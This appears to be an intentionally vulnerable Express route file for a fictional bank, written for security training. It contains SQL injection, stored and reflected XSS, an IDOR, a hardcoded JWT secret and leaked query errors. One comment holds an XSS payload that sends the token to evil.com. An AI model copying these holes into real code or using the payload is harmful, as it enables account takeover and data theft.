// Route transactions — vulnérabilités intentionnelles
const express = require('express');
const jwt     = require('jsonwebtoken');
const db      = require('../config/database');
const router  = express.Router();

const auth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token requis' });
  try {
    req.user = jwt.verify(token, 'dakarbank_secret_2024');
    next();
  } catch {
    res.status(403).json({ error: 'Token invalide' });
  }
};

// ❌ VULN 1 — SQL Injection sur la recherche de transactions
router.get('/search', auth, (req, res) => {
  const { motif, dateDebut, dateFin } = req.query;

  // ❌ Concaténation directe → SQL Injection
  const query = `SELECT * FROM transactions
                 WHERE motif LIKE '%${motif}%'
                 AND created_at BETWEEN '${dateDebut}' AND '${dateFin}'
                 ORDER BY created_at DESC`;

  db.all(query, (err, transactions) => {
    if (err) {
      // ❌ Requête SQL exposée dans la réponse
      return res.status(500).json({ error: err.message, query });
    }
    res.json(transactions);
  });
});

// ❌ VULN 2 — XSS Stocké via les commentaires de transaction
// Le motif est stocké sans sanitization et reflété sans encodage
router.post('/:id/commentaire', auth, (req, res) => {
  const { commentaire } = req.body;

  // ❌ Commentaire stocké tel quel — peut contenir du JavaScript malveillant
  // Ex : <script>fetch('evil.com?t='+localStorage.getItem('token'))</script>
  db.run(
    'INSERT INTO commentaires_transaction (transaction_id, contenu, client_id) VALUES (?, ?, ?)',
    [req.params.id, commentaire, req.user.id],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      // ❌ Commentaire reflété sans encodage dans la réponse
      res.json({
        message:     'Commentaire ajouté',
        commentaire: commentaire, // ❌ XSS reflété
        id:          this.lastID,
      });
    }
  );
});

// ❌ VULN 3 — IDOR : accès à l'historique de n'importe quel client
router.get('/historique/:clientId', auth, (req, res) => {
  // ❌ Pas de vérification que clientId === req.user.id
  db.all(
    'SELECT * FROM transactions WHERE compte_source = ? OR compte_dest = ? ORDER BY created_at DESC',
    [req.params.clientId, req.params.clientId],
    (err, transactions) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json(transactions);
    }
  );
});

// ❌ VULN 4 — Repudiation : pas de logs immuables sur les virements
router.post('/annuler/:id', auth, (req, res) => {
  // ❌ Annulation sans vérification de propriété, sans log d'audit
  db.run(
    `UPDATE transactions SET statut='annulé' WHERE id=${req.params.id}`,
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      // ❌ Aucune trace : qui a annulé, quand, pourquoi
      res.json({ message: 'Transaction annulée', id: req.params.id });
    }
  );
});

module.exports = router;
